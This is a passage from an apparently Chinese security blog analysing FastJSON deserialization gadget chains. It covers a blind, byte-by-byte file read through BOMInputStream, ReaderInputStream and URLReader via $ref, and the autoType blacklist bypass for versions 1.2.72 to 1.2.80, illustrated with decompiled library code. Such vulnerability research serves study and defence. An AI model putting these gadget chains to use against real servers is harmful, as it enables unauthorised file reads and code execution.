<p>此处使用FastJSON特性，”$ref””: “$.xx.yy”表示调用JSON对象中xx的yy属性。payload中即调用abc(org.apache.commons.io.input.BOMInputStream的BOM属性，即调用BOMInputStream的getBOM()方法。</p>
<p>org.apache.commons.io.input.BOMInputStream类分析</p>
<p>构造方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 传入InputStream 类型的 delegate 和 ByteOrderMark 数组 boms</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BOMInputStream</span><span class="hljs-params">(InputStream delegate, <span class="hljs-type">boolean</span> include, ByteOrderMark... boms)</span><br></code></pre></td></tr></table></figure>

<p>getBOM()方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ByteOrderMark <span class="hljs-title function_">getBOM</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.firstBytes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.fbLength = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">maxBomSize</span> <span class="hljs-operator">=</span> ((ByteOrderMark)<span class="hljs-built_in">this</span>.boms.get(<span class="hljs-number">0</span>)).length();<br>            <span class="hljs-built_in">this</span>.firstBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[maxBomSize];        <br>			<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.firstBytes.length; ++i) &#123;<br>            <span class="hljs-built_in">this</span>.firstBytes[i] = <span class="hljs-built_in">this</span>.in.read(); <span class="hljs-comment">// 从 delegate 输入流从取出所有字节，组成一个 int 数组</span><br>            ++<span class="hljs-built_in">this</span>.fbLength;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.firstBytes[i] &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.byteOrderMark = <span class="hljs-built_in">this</span>.find(); <span class="hljs-comment">// 开始把实例化对象时传入的 ByteOrderMark 数组 boms 和从 delegate 输入流从取出所有字节组成的int数组进行比对。</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.byteOrderMark != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.include) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.byteOrderMark.length() &lt; <span class="hljs-built_in">this</span>.firstBytes.length) &#123;<br>                <span class="hljs-built_in">this</span>.fbIndex = <span class="hljs-built_in">this</span>.byteOrderMark.length();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.fbLength = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.byteOrderMark; <span class="hljs-comment">//返回 byteOrderMark</span><br>&#125;<br><span class="hljs-keyword">private</span> ByteOrderMark <span class="hljs-title function_">find</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.boms.iterator();<br><br>    ByteOrderMark bom;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!var1.hasNext()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        bom = (ByteOrderMark)var1.next();<br>    &#125; <span class="hljs-keyword">while</span>(!<span class="hljs-built_in">this</span>.matches(bom));<br><br>    <span class="hljs-keyword">return</span> bom;<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">matches</span><span class="hljs-params">(ByteOrderMark bom)</span> &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bom.length(); ++i) &#123;<br>        <span class="hljs-keyword">if</span> (bom.get(i) != <span class="hljs-built_in">this</span>.firstBytes[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>此处代码逻辑为将delegate 输入流的字节码转成 int 数组，然后用 ByteOrderMark 中的 bytes 挨个字节遍历进行比对，如果遍历过程有比对错误的 getBom 就会返回一个 null，如果遍历结束，没有比对错误那就会返回一个 ByteOrderMark 对象。所以此处文件读取成功的标志为 getBom 返回结果不为 null。故文件读取原理为字节码对比，通过遍历对比目标文件中字节码从而挨个字节获取文件内容，类似SQL盲注。</p>
<p>org.apache.commons.io.input.ReaderInputStream类分析：</p>
<p>构造方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ReaderInputStream</span><span class="hljs-params">(Reader reader, CharsetEncoder encoder, <span class="hljs-type">int</span> bufferSize)</span><br></code></pre></td></tr></table></figure>

<p>jdk.nashorn.api.scripting.URLReader类分析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">URLReader</span><span class="hljs-params">(URL url)</span><br></code></pre></td></tr></table></figure>

<p>此处传入URL,则此处可使用file jar http 等协议</p>
<h3 id="91-2-72-Fastjson"><a href="#91-2-72-Fastjson" class="headerlink" title="9	1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80"></a>9	1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</h3><h4 id="利用链分析：-9"><a href="#利用链分析：-9" class="headerlink" title="利用链分析："></a>利用链分析：</h4><p>FastJSON1.2.80与1.2.68相比，ParserConfig#checkAutoType()添加了期望类黑名单，期望类在黑名单中则无法加载，若期望类及目标类不在黑名单中则可使用与1.2.68类似绕过方法绕过检测。</p>
<p>ParserConfig#checkAutoType()方法如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeCheckHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//默认为空不进入</span><br>            <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeCheckHandlers.iterator();<br><br>            <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>                <span class="hljs-type">AutoTypeCheckHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (AutoTypeCheckHandler)var4.next();<br>                Class&lt;?&gt; type = h.handler(typeName, expectClass, features);<br>                <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> type;<br>                &#125;<br>            &#125;<br>        &#125;<br>		<br>        <span class="hljs-type">int</span> <span class="hljs-variable">safeModeMask</span> <span class="hljs-operator">=</span> Feature.SafeMode.mask;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">safeMode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.safeMode || (features &amp; safeModeMask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; safeModeMask) != <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (safeMode) &#123;<span class="hljs-comment">//若safeMode为true进入，不反序列化所有类</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;safeMode not support autoType : &quot;</span> + typeName);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">192</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-type">boolean</span> expectClassFlag;<br>            <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//期望类为空</span><br>                expectClassFlag = <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//期望类不为空</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">expectHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());<br>                <span class="hljs-keyword">if</span> (expectHash != -<span class="hljs-number">8024746738719829346L</span> &amp;&amp; expectHash != <span class="hljs-number">3247277300971823414L</span> &amp;&amp; expectHash != -<span class="hljs-number">5811778396720452501L</span> &amp;&amp; expectHash != -<span class="hljs-number">1368967840069965882L</span> &amp;&amp; expectHash != <span class="hljs-number">2980334044947851925L</span> &amp;&amp; expectHash != <span class="hljs-number">5183404141909004468L</span> &amp;&amp; expectHash != <span class="hljs-number">7222019943667248779L</span> &amp;&amp; expectHash != -<span class="hljs-number">2027296626235911549L</span> &amp;&amp; expectHash != -<span class="hljs-number">2114196234051346931L</span> &amp;&amp; expectHash != -<span class="hljs-number">2939497380989775398L</span>) &#123;<br>                    expectClassFlag = <span class="hljs-literal">true</span>;<span class="hljs-comment">//期望类不为空且不在黑名单中</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    expectClassFlag = <span class="hljs-literal">false</span>;<span class="hljs-comment">//期望类在黑名单中</span><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-keyword">if</span> (h1 == -<span class="hljs-number">5808493101479473382L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((h1 ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">2</span>)) * <span class="hljs-number">1099511628211L</span>;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">fullHash</span> <span class="hljs-operator">=</span> TypeUtils.fnv1a_64(className);<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">internalWhite</span> <span class="hljs-operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES, fullHash) &gt;= <span class="hljs-number">0</span>;<br>                <span class="hljs-type">long</span> hash;<br>                <span class="hljs-type">int</span> mask;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.internalDenyHashCodes != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//黑名单校验</span><br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.internalDenyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                Class clazz;<br>                <span class="hljs-comment">////!internalWhite不为true  autoTypeSupport或expectClassFlag为true则进入</span><br>                <span class="hljs-keyword">if</span> (!internalWhite &amp;&amp; (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;<br>                    hash = h3;<br><br>                    <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<span class="hljs-comment">//白名单校验，若在白名单中则返回类</span><br>                        hash ^= (<span class="hljs-type">long</span>)className.charAt(mask);<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span> &amp;&amp; Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, fullHash) &lt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                clazz = TypeUtils.getClassFromMapping(typeName);<span class="hljs-comment">//从map中获取类</span><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    clazz = (Class)<span class="hljs-built_in">this</span>.typeMapping.get(typeName);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (internalWhite) &#123;<br>                    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//期望类不为空切目标类不为HashMap、LinkedHashMap且目标类不继承至期望类则抛出异常</span><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; clazz != LinkedHashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//以下与1.2.68基本一致</span><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<br>                        hash = h3;<br><br>                        <span class="hljs-keyword">for</span>(mask = <span class="hljs-number">3</span>; mask &lt; className.length(); ++mask) &#123;<br>                            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> className.charAt(mask);<br>                            hash ^= (<span class="hljs-type">long</span>)c;<br>                            hash *= <span class="hljs-number">1099511628211L</span>;<br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (Arrays.binarySearch(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                                clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">true</span>);<br>                                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                                    <span class="hljs-keyword">return</span> expectClass;<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                                &#125;<br><br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-string">&quot;.class&quot;</span>;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.defaultClassLoader != <span class="hljs-literal">null</span>) &#123;<br>                            is = <span class="hljs-built_in">this</span>.defaultClassLoader.getResourceAsStream(resource);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">ClassReader</span> <span class="hljs-variable">classReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(is, <span class="hljs-literal">true</span>);<br>                            <span class="hljs-type">TypeCollector</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeCollector</span>(<span class="hljs-string">&quot;&lt;clinit&gt;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                            classReader.accept(visitor);<br>                            jsonType = visitor.hasJsonType();<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Exception var24) &#123;<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        IOUtils.close(is);<br>                    &#125;<br><br>                    mask = Feature.SupportAutoType.mask;<br>                    <span class="hljs-type">boolean</span> <span class="hljs-variable">autoTypeSupport</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="hljs-number">0</span> || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;<br>                        <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>                        clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, cacheClass);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (jsonType) &#123;<br>                            TypeUtils.addMapping(typeName, clazz);<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                                TypeUtils.addMapping(typeName, clazz);<br>                                <span class="hljs-keyword">return</span> clazz;<br>                            &#125;<br><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                        &#125;<br><br>                        <span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, <span class="hljs-built_in">this</span>.propertyNamingStrategy);<br>                        <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                            TypeUtils.addMapping(typeName, clazz);<br>                        &#125;<br><br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>1.2.73中修改JavaBeanDeserializer#createInstance()方法，修改之前对类属性恢复的需要属性必须有Annotation，修改后类属性与显示指定的类不相同和拥有注解两者只需满足一个即可，而显示指定的类可以不传置为null</p>
<p><img src="/image/0ad2638f-0407-470d-9c2c-9384bb556be3.png" srcset="/img/loading.gif" lazyload alt="image-20220922101838051"></p>
<p>实例化类属性后，fastjson就会将其加入到反序列化缓存TypeUtils.mappings中，之后对类反序列化时，就会从缓存中获取类</p>
<p>MiscCodec#deserialz()</p>
